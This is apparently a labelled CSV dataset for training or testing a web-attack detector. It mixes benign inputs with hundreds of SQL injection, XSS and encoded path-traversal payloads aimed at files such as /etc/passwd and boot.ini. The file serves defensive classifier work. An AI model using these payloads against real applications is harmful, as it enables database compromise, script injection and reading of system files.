"payload","label"
"%252e%252e/%252e%252e/etc/passwd","Suspicious"
"vin","Normal"
"SELECT TOP 50 PERCENT * FROM am","Normal"
"%c0.%c0.%bg%qf%c0.%c0.%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts","Suspicious"
"1'  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( 'kgdt' like 'kgdt","SQLi"
"Languages","Normal"
"noviercas","Normal"
"-8032%'   )    )     )   or 9323  =  9323#","SQLi"
"<main onmouseout=""alert(1)"">test</main>","XSS"
"1 )  as obzn where 7652 = 7652 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) --","SQLi"
"3andador4","Normal"
"<header id=x tabindex=1 onfocusin=alert(1)></header>","XSS"
"1'   )    )    as nhkp where 8030  =  8030","SQLi"
"%f8%80%80%80%ae%f8%80%80%80%ae%uEFC8%f8%80%80%80%ae%f8%80%80%80%ae%uEFC8%f8%80%80%80%ae%f8%80%80%80%ae%uEFC8%f8%80%80%80%ae%f8%80%80%80%ae%uEFC8%f8%80%80%80%ae%f8%80%80%80%ae%uEFC8etc%uEFC8issue","Suspicious"
"arpad4@emepleo.lr","Normal"
"( select  ( case when  ( 3592 = 3592 )  then 3592 else 3592* ( select 3592 from information_schema.character_sets )  end  )  )","SQLi"
"%c0%5e%c0%5e%c0%qfboot.ini","Suspicious"
"SELECT COUNT ( excitement ) FROM drink","Normal"
"1%' or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","SQLi"
"1"" )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and  ( ""cjkk"" like ""cjkk","SQLi"
"%uff0e%uff0e%c0%af%uff0e%uff0e%c0%af%uff0e%uff0e%c0%af%uff0e%uff0e%c0%af%uff0e%uff0e%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts","Suspicious"
"calle leganes 155 13?e","Normal"
"1'   )    )    and 4650  =  1322#","SQLi"
"-9037%"" union all select 6583#","SQLi"
"SELECT * FROM seat FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM generally","Normal"
"%c0%5e%c0%5e%%32%%66%c0%5e%c0%5e%%32%%66%c0%5e%c0%5e%%32%%66%c0%5e%c0%5e%%32%%66boot.ini","Suspicious"
"..../%f0%80%80%afetc%f0%80%80%afpasswd","Suspicious"
"zaleska_legon@zampy.so","Normal"
"1'||  (  select 'yhkt' from dual where 7105  =  7105 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   ||'","SQLi"
"-2300  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )","SQLi"
"<li><a href=""/wiki/Fitness_landscape"" title=""Fitness landscape"">Fitness landscape </a> </li>","Normal"
"1'  )  )   and elt ( 4249 = 4249,7259 )  and   (  (  'xjns' = 'xjns","SQLi"
"%%c0%6e%c0%6e%u2216%%c0%6e%c0%6e%u2216%%c0%6e%c0%6e%u2216etc%u2216passwd","Suspicious"
"1  )   where 4780  =  4780","SQLi"
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'frpo' like 'frpo","SQLi"
"??%c1%1c??%c1%1c??%c1%1c??%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts","Suspicious"
"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:7.5em"">Late modern </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;padding:0px"">","Normal"
"%f0%80%80%ae%f0%80%80%ae%e0%80%afboot.ini","Suspicious"
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""ihqf""  =  ""ihqf","SQLi"
"0x2e0x2e%c0%9v0x2e0x2e%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts","Suspicious"
"1""  )   union all select null,null,null,null,null,null,null,null--","SQLi"
"<blink onmouseleave=""alert(1)"">test</blink>","XSS"
"1  )  )   )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( 1729 = 1729","SQLi"
"Airbus says rival sticking seat concept 1950s , average girth newly christened &quot; jet set &quot; narrower","Normal"
"SELECT COUNT ( hardly )  FROM changing","Normal"
"1%' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  '","SQLi"
"ji1a","Normal"
".%00.%u2215.%00.%u2215.%00.%u2215.%00.%u2215.%00.%u2215.%00.%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts","Suspicious"
"%c0.%c0.%255c%c0.%c0.%255c%c0.%c0.%255c%c0.%c0.%255cetc%255cissue","Suspicious"
"1' )  and  ( 3020 = 3020 ) *6703 and  ( 'rskq' = 'rskq","SQLi"
"-7111' or  ( 8459 = 8459 ) *4906","SQLi"
"1  )  )   and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  4450 = 4450","SQLi"
"1"" )  where 6632 = 6632 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --","SQLi"
"mcrae-broccolino@lodgemadrid.pk","Normal"
"%%c0%6e%c0%6e%25c0%25af%%c0%6e%c0%6e%25c0%25af%%c0%6e%c0%6e%25c0%25afboot.ini","Suspicious"
"SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_logo' LIMIT 1","Normal"
"1'+  (  select uqdb where 3508  =  3508 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SQLi"
"<dt onpointerover=alert(1)>XSS</dt>","XSS"
"-7786'  )  )   or 9323 = 9323#","SQLi"
"<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>","XSS"
"-9650'  )   or 1390  =  3209","SQLi"
"SELECT DAYOFWEEK ( ""2017-06-15"" ) ;","Normal"
"-5738""  )   as efbn where 8541  =  8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#","SQLi"
"arbelez grippo","Normal"
"%5C..%c1%1c%5C..%c1%1c%5C..%c1%1cetc%c1%1cpasswd","Suspicious"
"23670","Normal"
"SELECT * FROM coming","Normal"
"SELECT AVG ( mixture ) FROM experience SELECT SUM ( nuts )","Normal"
"37711","Normal"
"<embed onmouseout=""alert(1)"">test</embed>","XSS"
"i5sepulta","Normal"
"1',iif  (  9496  =  4153,1,1/0  )","SQLi"
"??%5c??%5cetc%5cissue","Suspicious"
"danning-marrow@etxarriaranatz.nr","Normal"
"<style>:target {color:red;}</style><style id=x style=""transition:color 1s"" ontransitionend=alert(1)></style>","XSS"
"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""qqfd"" like ""qqfd","SQLi"
"%%c0%6e%c0%6e%c1%8s%%c0%6e%c0%6e%c1%8s%%c0%6e%c0%6e%c1%8s%%c0%6e%c0%6e%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts","Suspicious"
"<script onload=alert(1) src=validjs.js></script>","XSS"
"1""  )  )   as hace where 8785 = 8785","SQLi"
"?.%5c?.%5c?.%5c?.%5c?.%5c?.%5cetc%5cissue","Suspicious"
"zahnley","Normal"
"583no","Normal"
"<slot onpointerup=alert(1)>XSS</slot>","XSS"
"admin""  )   or ""1""  =  ""1","SQLi"
"1'+ ( select 'plcm' where 2141 = 2141 and elt ( 3114 = 3114,sleep ( 5  )  )  #","SQLi"
"1'  )  )   and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  'rgyc' = 'rgyc","SQLi"
"-4583'  )   as evbo where 6055  =  6055 union all select 6055--","SQLi"
"-7054  )   as gzvf where 9146  =  9146 or 3038  =  3038","SQLi"
"53364918l","Normal"
"%2e.%c1%af%2e.%c1%af%2e.%c1%af%2e.%c1%af%2e.%c1%af%2e.%c1%afboot.ini","Suspicious"
"-7551 or elt ( 6900 = 7195,7195 )","SQLi"
".%00.%c0%9v.%00.%c0%9v.%00.%c0%9vetc%c0%9vissue","Suspicious"
"-2648' )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( 'sawt' = 'sawt","SQLi"
"<colgroup onmouseup=""alert(1)"">test</colgroup>","XSS"
"-2916""   )    )    or 4946  =  8232--","SQLi"
"</span> <span class=""toctext"">Applications","Normal"
"<noframes id=x tabindex=1 onfocus=alert(1)></noframes>","XSS"
"1"" where 5477  =  5477","SQLi"
"SELECT * FROM though ORDER BY good ASC, lips DESC","Normal"
"ostapchuk casal","Normal"
"%e0%80%ae%e0%80%ae%5cetc%5cissue","Suspicious"
".%2e%uF025.%2e%uF025.%2e%uF025.%2e%uF025.%2e%uF025etc%uF025passwd","Suspicious"
"/var/log/wtmp","Suspicious"
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'zaru'  =  'zaru","SQLi"
"..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd","Suspicious"
"01206","Normal"
"/var/log/messages","Suspicious"
".%2e%f0%80%80%af.%2e%f0%80%80%af.%2e%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts","Suspicious"
"<output oncopy=""alert(1)"" contenteditable>test</output>","XSS"
"37ce","Normal"
"??%f8%80%80%80%af??%f8%80%80%80%af??%f8%80%80%80%af??%f8%80%80%80%af??%f8%80%80%80%af??%f8%80%80%80%afetc%f8%80%80%80%afpasswd","Suspicious"
"<rp onbeforecut=""alert(1)"" contenteditable>test</rp>","XSS"
"-6546""  )   order by 1#","SQLi"
"<a href=""#"">Scrapy</a>","Normal"
"-3582  )   where 5873  =  5873 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --","SQLi"
"%c0%2e%c0%2e%u2216%c0%2e%c0%2e%u2216%c0%2e%c0%2e%u2216%c0%2e%c0%2e%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts","Suspicious"
"5223158056651718","Normal"
"<form onreset=alert(1)><input type=reset>","XSS"
"<A HREF=""http://0102.0146.0007.00000223/""></A>","XSS"
"retiendas","Normal"
"%e0%80%ae%e0%80%ae%u2215%e0%80%ae%e0%80%ae%u2215etc%u2215passwd","Suspicious"
"1  )   where 5866  =  5866 and 4595  =  4595#","SQLi"
"1 )  as imdt where 6431 = 6431","SQLi"
"-6431""   )    )    union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#","SQLi"
"42892408f","Normal"
"thirugna","Normal"
"1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'vtoi' like 'vtoi","SQLi"
"hi or a = a","SQLi"
"<ol onpointerup=alert(1)>XSS</ol>","XSS"
"%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd","Suspicious"
"heldo","Normal"
"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507","SQLi"
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'nmat' like 'nmat","SQLi"
"25307","Normal"
"-2745' or elt  (  1032  =  1032,3623  )","SQLi"
"I felt second term Obama , free pressures future elections , would fulfill hope heard long","Normal"
"1,iif  (  6625  =  6625,1,1/0  )","SQLi"
"83288994z","Normal"
"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--","SQLi"
"1,  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )","SQLi"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><small id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></small>","XSS"
".?%252fetc%252fissue","Suspicious"
"%c0.%c0.%c0%qf%c0.%c0.%c0%qf%c0.%c0.%c0%qf%c0.%c0.%c0%qf%c0.%c0.%c0%qf%c0.%c0.%c0%qfboot.ini","Suspicious"
"<bdi oncut=""alert(1)"" contenteditable>test</bdi>","XSS"
"%e0%80%ae%e0%80%ae%255c%e0%80%ae%e0%80%ae%255c%e0%80%ae%e0%80%ae%255cboot.ini","Suspicious"
"1""  )  )   or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --","SQLi"
"1'  )  )   or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #","SQLi"
"%25c0%25ae%25c0%25ae%252f%25c0%25ae%25c0%25ae%252f%25c0%25ae%25c0%25ae%252f%25c0%25ae%25c0%25ae%252f%25c0%25ae%25c0%25ae%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts","Suspicious"
"%uff0e%uff0e%c0%af%uff0e%uff0e%c0%af%uff0e%uff0e%c0%af%uff0e%uff0e%c0%afboot.ini","Suspicious"
"chao-pin2","Normal"
"1%'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SQLi"
"disipar","Normal"
"<svg id=x tabindex=1 onbeforeactivate=alert(1)></svg>","XSS"
"<style>:target {color:red;}</style><ul id=x style=""transition:color 1s"" ontransitionend=alert(1)></ul>","XSS"
"%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd","Suspicious"
"</span> <span class=""reference-text""><cite class=""citation arxiv"">Goodfellow, Ian J.; Shlens, Jonathon; Szegedy, Christian (2014). ""Explaining and Harnessing Adversarial Examples"". <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1412.6572"">1412.6572 </a>","Normal"
"1%""  )  )   )  or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --","SQLi"
"1'  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  'yzdp' = 'yzdp","SQLi"
"1%""  )   union all select null,null,null--","SQLi"
"%2e.%bg%qf%2e.%bg%qf%2e.%bg%qf%2e.%bg%qf%2e.%bg%qfetc%bg%qfpasswd","Suspicious"
"1%'   )    )     )   union all select null,null,null,null,null--","SQLi"
".?%f0%80%80%afetc%f0%80%80%afissue","Suspicious"
"<map draggable=""true"" ondragend=""alert(1)"">test</map>","XSS"
"SELECT AVG ( Price ) FROM physical","Normal"
"peimel","Normal"
"%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qf%25c0%25ae%25c0%25ae%bg%qfetc%bg%qfissue","Suspicious"
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh'  =  'xemh","SQLi"
"0x2e0x2e%255cboot.ini","Suspicious"
"<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>","XSS"
"%%c0%6e%c0%6e%c0%qf%%c0%6e%c0%6e%c0%qf%%c0%6e%c0%6e%c0%qf%%c0%6e%c0%6e%c0%qf%%c0%6e%c0%6e%c0%qf%%c0%6e%c0%6e%c0%qfetc%c0%qfissue","Suspicious"
"%f8%80%80%80%ae%f8%80%80%80%ae%c1%9c%f8%80%80%80%ae%f8%80%80%80%ae%c1%9c%f8%80%80%80%ae%f8%80%80%80%ae%c1%9c%f8%80%80%80%ae%f8%80%80%80%ae%c1%9c%f8%80%80%80%ae%f8%80%80%80%ae%c1%9c%f8%80%80%80%ae%f8%80%80%80%ae%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts","Suspicious"
"1""   )    )    as dshc where 9911  =  9911 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","SQLi"
"%c0%ee%c0%ee%c0%9vetc%c0%9vissue","Suspicious"
"1 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) # cqqs","SQLi"
"areces casallac","Normal"
"0769789407660165","Normal"
"%2e.\%2e.\boot.ini","Suspicious"
"1%"" )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( ""%"" = ""","SQLi"
"select * from users where id = 1 union select  @ $,version (  )  -- 1","SQLi"
"%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%af%%32%%65%%32%%65%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts","Suspicious"
"%%32%%65%%32%%65%255cboot.ini","Suspicious"
"..%01%%35%%63etc%%35%%63passwd","Suspicious"
"..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts","Suspicious"
"SELECT volume, motor+ ', ' + comfortable+ ' ' + dollar+ ', ' + plus AS cowboy  FROM could","Normal"
"shirene","Normal"
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and  ( 'yvbb' = 'yvbb","SQLi"
"%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cpasswd","Suspicious"
"-2314%'  )  )   union all select 4612,4612--","SQLi"
".%00.%25c1%259cetc%25c1%259cissue","Suspicious"
"1"" )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #","SQLi"
"<noframes onmouseout=""alert(1)"">test</noframes>","XSS"
"1%""   )    )     )   and sleep  (  5  )   and    (    (     (  ""%""  =  ""","SQLi"
"This week Standard &amp; Poor &apos;s , rating agency , cited increasing household leverage , mainly rising mortgages , risk factor Asian banks &quot; creditworthiness","Normal"
"1' where 2774  =  2774 union all select null,null,null,null,null#","SQLi"
"<rt id=x tabindex=1 onactivate=alert(1)></rt>","XSS"
"<article draggable=""true"" ondragenter=""alert(1)"">test</article>","XSS"
"1"" where 7022 = 7022","SQLi"
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  8997  =  8997","SQLi"
"%5C..%c0%qf%5C..%c0%qf%5C..%c0%qf%5C..%c0%qfetc%c0%qfissue","Suspicious"
"mordi3nt-e","Normal"
"<tt onbeforepaste=""alert(1)"" contenteditable>test</tt>","XSS"
"SELECT support ( s )  FROM new FULL OUTER JOIN","Normal"
"SELECT * FROM extra ORDER BY outside, hospital","Normal"
"%2e%c0%ae%2f%2e%c0%ae%2f%2e%c0%ae%2f%2e%c0%ae%2f%2e%c0%ae%2fboot.ini","Suspicious"
"holgachona","Normal"
"<section onmouseleave=""alert(1)"">test</section>","XSS"
"349","Normal"
"%2e%2e%25c1%259c%2e%2e%25c1%259c%2e%2e%25c1%259c%2e%2e%25c1%259c%2e%2e%25c1%259c%2e%2e%25c1%259cetc%25c1%259cpasswd","Suspicious"
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'wytg'  =  'wytg","SQLi"
"<tfoot id=x tabindex=1 ondeactivate=alert(1)></tfoot><input id=y autofocus>","XSS"
"1'   )    )    union all select null#","SQLi"
"%c0.%c0.%c0%qf%c0.%c0.%c0%qf%c0.%c0.%c0%qf%c0.%c0.%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts","Suspicious"
"1"" )  and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --","SQLi"
"1%""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --","SQLi"
"1"" and make_set  (  8403  =  8403,8899  )   and ""bbgg""  =  ""bbgg","SQLi"
"??%255c??%255cetc%255cissue","Suspicious"
"SELECT * FROM upward FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ask","Normal"
"%c0%2e%c0%2e0x2f%c0%2e%c0%2e0x2f%c0%2e%c0%2e0x2f%c0%2e%c0%2e0x2f%c0%2e%c0%2e0x2fboot.ini","Suspicious"
"<center onkeyup=""alert(1)"" contenteditable>test</center>","XSS"
"599iad12a","Normal"
"%c0.%c0.%25c0%25af%c0.%c0.%25c0%25af%c0.%c0.%25c0%25af%c0.%c0.%25c0%25afboot.ini","Suspicious"
"%f8%80%80%80%ae%f8%80%80%80%ae%%35%%63%f8%80%80%80%ae%f8%80%80%80%ae%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts","Suspicious"
"1'|| ( select 'kfyh' where 4737 = 4737 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x  )  )  ||'","SQLi"
"mayola laparra","Normal"
"1' where 2913 = 2913 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --","SQLi"
"SELECT shutID AS ID, canal AS pile FROM bit","Normal"
"1204530000000000","Normal"
"<div id=x tabindex=1 onbeforeactivate=alert(1)></div>","XSS"
"1""   )    )     )   and 7153  =  7474--","SQLi"
"SELECT * FROM operation WHERE stick BETWEEN ""generally"" AND    ""promised""","Normal"
"<source onpointerenter=alert(1)>XSS</source>","XSS"
"select  ( case when  ( 9393 = 5530 )  then 9393 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--","SQLi"
"..%01%%35%%63..%01%%35%%63..%01%%35%%63..%01%%35%%63..%01%%35%%63etc%%35%%63issue","Suspicious"
"<li id=""cite_note-304""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-304"">^ </a> </b>","Normal"
"-3450' where 4478  =  4478 or 9323  =  9323#","SQLi"
"<plaintext onmouseover=""alert(1)"">test</plaintext>","XSS"
"0893945403405745","Normal"
"..%01%c0%qf..%01%c0%qf..%01%c0%qf..%01%c0%qf..%01%c0%qfetc%c0%qfpasswd","Suspicious"
"' or 'text'  =  n'text'","SQLi"
"<datalist id=x tabindex=1 onactivate=alert(1)></datalist>","XSS"
"intuitivo","Normal"
"carrillo-whitson@mobilecrm.fj","Normal"
"%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/etc/issue","Suspicious"
"1%""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""%""  =  ""","SQLi"
"-8538%' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  '","SQLi"
"%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini","Suspicious"
"<li><a href=""/wiki/Computability_theory"" title=""Computability theory"">Computability theory </a> </li>","Normal"
"SELECT TOP 3 * FROM roar WHERE tomorrow = 'light'","Normal"
"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --","SQLi"
"0x2e0x2e/0x2e0x2e/0x2e0x2e/etc/passwd","Suspicious"
"fluvia","Normal"
"<style>@keyframes slidein {}</style><source style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></source>","XSS"
"etxebarria","Normal"
"%2e.%5c%2e.%5c%2e.%5cetc%5cpasswd","Suspicious"
"<style>:target {color:red;}</style><image id=x style=""transition:color 1s"" ontransitionend=alert(1)></image>","XSS"
"SELECT * FROM form  WHERE apple NOT LIKE '[additional]%'","Normal"
"<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>","XSS"
"<ruby onmouseover=""alert(1)"">test</ruby>","XSS"
"?.%f8%80%80%80%af?.%f8%80%80%80%af?.%f8%80%80%80%af?.%f8%80%80%80%af?.%f8%80%80%80%af?.%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts","Suspicious"
"<applet id=x tabindex=1 onfocusin=alert(1)></applet>","XSS"
"1   )    )    as atiy where 3855  =  3855 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --","SQLi"
"-5193 where 2175  =  2175 union all select 2175,2175,2175,2175,2175,2175,2175,2175,2175,2175#","SQLi"
"%c0%ee%c0%ee%25c0%25af%c0%ee%c0%ee%25c0%25af%c0%ee%c0%ee%25c0%25afetc%25c0%25afpasswd","Suspicious"
"1'  )  )   )  and 1743 = 6793 and   (  (   ( 'rgcv' = 'rgcv","SQLi"
"<ins id=x tabindex=1 onbeforeactivate=alert(1)></ins>","XSS"
"arme!lluela","Normal"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%1c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%1c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%1c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%1c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%1c%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%1cboot.ini","Suspicious"
".\..\.\..\.\..\.\..\etc\issue","Suspicious"
"aguijon!ear","Normal"
"<title ondblclick=""alert(1)"">test</title>","XSS"
